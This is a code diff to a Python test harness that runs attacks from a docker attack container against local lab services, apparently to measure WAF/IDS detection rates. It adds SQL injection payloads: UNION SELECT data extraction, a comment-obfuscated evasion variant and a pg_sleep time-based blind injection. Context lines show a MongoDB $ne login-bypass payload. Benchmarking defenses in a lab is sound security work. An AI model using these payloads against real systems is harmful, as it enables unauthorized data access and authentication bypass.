@@ -10,6 +10,9 @@ from dataclasses import dataclass
 from datetime import datetime
 from pathlib import Path
 from typing import Callable, Dict, List, Optional, Sequence, Tuple
+import urllib.parse
+import urllib.request
+import urllib.error
 
 BASE_EXEC = ["docker", "compose", "exec", "-T", "attack-client"]
 MEASURE_SCRIPT_CANDIDATES = [
@@ -460,6 +463,10 @@ def run_attack(config: Attack, measure_script_path: Optional[str]) -> Dict[str, 
 
 
 def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
+    # 新增: 三类直接 HTTP 注入测试（不依赖 sqlmap），用于 WAF/IDS 探测 TPR/FPR
+    # basic: 直接 UNION SELECT
+    # obfuscated: 利用注释混淆 S/*x*/E/*x*/L/*x*/E/*x*/C/*x*/T
+    # stored procedure: 调用 pg_sleep 作为存储过程/函数调用示例
     sqlmap_union_payload = "http://127.0.0.1:8081/pg/users?id=1%20UNION%20ALL%20SELECT%20NULL,current_database(),version()--"
     sqlmap_time_payload = "http://127.0.0.1:8081/pg/users?id=1%20AND%209999=(SELECT%209999%20FROM%20PG_SLEEP(1.5))"
     mongo_payload = "http://127.0.0.1:8081/mongo/login?username[$ne]=1&password[$ne]=1"
@@ -501,7 +508,97 @@ def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
         ]
         brute_force_notes = "未找到 PIN 字典，回退到纯暴力枚举"
 
-    return [
+    attacks: List[Attack] = [
+        Attack(
+            name="http_pg_sqli_basic",
+            tool="raw-http",
+            target="PostgreSQL",
+            technique="基础SQL注入",
+            command=[
+                *BASE_EXEC,
+                "python3",
+                "/root/attack-scripts/raw_http_attack.py",
+                "--url",
+                "http://127.0.0.1:8081/pg/users",
+                "--param",
+                "id=1 UNION ALL SELECT NULL,current_database(),version()--",
+                "--attack-id",
+                "BASIC_SQLI",
+            ],
+            success_parser=lambda c, o, e: (
+                c == 0,
+                "基础SQL注入请求完成" if c == 0 else e[-160:],
+            ),
+            cpu_service="postgres-db",
+            latency_args=[
+                "--url",
+                sqlmap_union_payload,
+                "--samples",
+                "6",
+                "--delay",
+                "0.25",
+            ],
+        ),
+        Attack(
+            name="http_pg_sqli_obfuscated",
+            tool="raw-http",
+            target="PostgreSQL",
+            technique="混淆SQL注入",
+            command=[
+                *BASE_EXEC,
+                "python3",
+                "/root/attack-scripts/raw_http_attack.py",
+                "--url",
+                "http://127.0.0.1:8081/pg/users",
+                "--param",
+                "id=1/**/UNION/**/ALL/**/SELECT/**/NULL,current_database(),version()--",
+                "--attack-id",
+                "OBFUSCATED_SQLI",
+            ],
+            success_parser=lambda c, o, e: (
+                c == 0,
+                "混淆SQL注入请求完成" if c == 0 else e[-160:],
+            ),
+            cpu_service="postgres-db",
+            latency_args=[
+                "--url",
+                sqlmap_union_payload,
+                "--samples",
+                "6",
+                "--delay",
+                "0.25",
+            ],
+        ),
+        Attack(
+            name="http_pg_sqli_storedproc",
+            tool="raw-http",
+            target="PostgreSQL",
+            technique="存储过程调用",
+            command=[
+                *BASE_EXEC,
+                "python3",
+                "/root/attack-scripts/raw_http_attack.py",
+                "--url",
+                "http://127.0.0.1:8081/pg/users",
+                "--param",
+                "id=1 AND 9999=(SELECT 9999 FROM pg_sleep(0.8))",
+                "--attack-id",
+                "PROC_SQLI",
+            ],
+            success_parser=lambda c, o, e: (
+                c == 0,
+                "存储过程注入请求完成" if c == 0 else e[-160:],
+            ),
+            cpu_service="postgres-db",
+            latency_args=[
+                "--url",
+                sqlmap_time_payload,
+                "--samples",
+                "4",
+                "--delay",
+                "0.6",
+            ],
+        ),
         Attack(
             name="sqlmap_pg_union",
             tool="sqlmap",
@@ -642,6 +739,7 @@ def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
             extra_note=brute_force_notes,
         ),
     ]
+    return attacks
 
 
 def summarize(results: List[Dict[str, object]]) -> None:
